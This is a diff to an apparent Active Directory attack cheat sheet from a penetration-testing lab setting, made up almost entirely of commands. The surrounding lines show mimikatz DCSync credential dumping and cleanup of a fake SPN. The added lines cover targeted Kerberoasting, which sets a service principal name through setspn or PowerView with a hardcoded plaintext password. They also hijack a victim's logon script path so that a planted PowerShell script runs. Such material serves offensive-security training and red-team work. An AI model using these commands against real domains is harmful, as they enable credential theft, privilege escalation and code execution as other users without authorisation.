@@ -117,7 +117,7 @@ runas /netonly /user:INLANEFREIGHT\adunn powershell
 privilege::debug
 lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 ```
-## Cleanup considerations
+## Remove SPN
 ---
 **Removing the Fake SPN from adunn's Account**
 ```PowerShell
@@ -130,4 +130,33 @@ Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Cre
 Confirming damundsen was Removed from the Group
 ```PowerShell
 Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+```
+## GenericWrite on User
+---
+####  Targeted Kerberoasting
+---
+Set SPN (if you're running a process as the user with GenericWrite)
+```
+setspn -a domain.local/user.domain.local:1337 domain.local\user
+```
+!!! alert "If your're running as different user"
+	
+	Import-Module .\Powerview.ps1
+	$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+	$Cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $SecPassword)
+
+	Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='foobar/xd'}
+
+### Change users logon scripts
+___
+Global writeable location
+```powershell
+cd C:\programdata\
+echo 'whoami > C:\programdata\out.txt' > test.ps1
+
+Set-DomainObject -Identity <targetuser> -SET @{scriptpath='C:\programdata\test.ps1'}
+```
+check if it worked
+```
+net user <target user>
 ```
